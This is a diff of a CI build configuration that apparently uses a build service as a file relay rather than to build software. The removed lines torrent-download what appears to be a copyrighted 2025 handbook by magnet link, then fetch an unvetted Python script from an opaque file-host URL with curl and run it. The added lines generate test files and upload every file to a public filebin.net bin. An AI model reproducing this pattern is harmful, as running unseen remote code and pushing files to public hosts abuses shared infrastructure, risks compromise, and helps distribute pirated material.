@@ -5,20 +5,25 @@ branches:
   only:
     - Sera
 
-install:
-  - sudo apt install -y nodejs npm curl python3 python3-pip
-  - npm install webtorrent-cli
-  - pip3 install requests
-
 build_script:
   - |
-    echo "Starting torrent download..."
-    mkdir downloads
-    npx webtorrent download "magnet:?xt=urn:btih:66092C96207B7EC52A67E812CC7071433EC6D050&dn=Kurniawan%20T.%20Handbook%20of%20Microplastic%20Pollution%20in%20the%20Environment...2025&tr=udp://tracker.bittor.pw:1337/announce&tr=udp://tracker.opentrackr.org:1337/announce&tr=udp://tracker.dler.org:6969/announce&tr=udp://open.stealth.si:80/announce&tr=udp://tracker.torrent.eu.org:451/announce&tr=udp://exodus.desync.com:6969/announce&tr=udp://open.demonii.com:1337/announce" --out downloads
-    echo "Downloading completed."
+    # Create a test folder with multiple files and subfolders
+    mkdir -p test_folder/subfolder
+    echo "Content of file 1" > test_folder/file1.txt
+    echo "Content of file 2" > test_folder/file2.txt
+    echo "Content of subfile 1" > test_folder/subfolder/subfile1.txt
 
-    # Download the Python script
-    curl -o upload_files.py "https://content-provider32.greencdn.link/Ps;Hs;up=1;uid=22999678;cid=3899574600;uip=72.27.149.45;aff=apis.uloz.to;did=uloz-to;fide=AJFy1g9;fs=gkptsddASpyr;hid=mKGMmTAi;rid=1892367393;tm=1750869424;ut=vd;rs=0;fet=download_cloud;He;ch=448f908552aa06f26b549c3959a3fd73;Pe/file/gkptsddASpyr/maain-py?bD&u=22999678&c=3899574600&De"
+    # Base upload URL
+    BASE_URL="https://filebin.net/Sahaujwsh/"
 
-    # Run the uploaded script
-    python3 upload_files.py
+    # Find all files recursively and upload each with filename appended
+    find test_folder -type f | while read -r file; do
+      filename=$(basename "$file")
+      upload_url="${BASE_URL}${filename}"
+      echo "Uploading $file to $upload_url..."
+      curl -X POST \
+        "$upload_url" \
+        -H 'accept: application/json' \
+        -H 'Content-Type: application/octet-stream' \
+        --data-binary "@$file"
+    done
